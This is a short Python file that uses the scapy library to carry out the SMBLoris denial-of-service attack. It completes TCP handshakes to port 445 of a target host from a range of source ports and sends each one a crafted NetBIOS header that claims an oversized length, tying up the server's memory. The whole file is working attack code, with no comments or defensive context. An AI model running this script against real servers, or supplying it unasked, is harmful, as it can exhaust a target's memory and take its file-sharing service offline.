from scapy.all import *
from scapy.layers.inet import IP, TCP


def smbloris(host: str, starting_source_port: int, number_of_ports: int) -> int:
    conf.L3socket = L3RawSocket
    ip_layer = IP()
    ip_layer.dst = host
    tcp_layer = TCP()
    tcp_layer.dport = 445

    for p in range(starting_source_port, starting_source_port + number_of_ports):
        tcp_layer.sport = p
        tcp_layer.flags = "S"

        r = sr1(ip_layer / tcp_layer)
        rt = r[TCP]
        tcp_layer.ack = rt.seq + 1
        tcp_layer.seq = rt.ack
        tcp_layer.flags = "A"
        sbss = "\x00\x01\xff\xff"
        send(ip_layer / tcp_layer / sbss)

    return 0
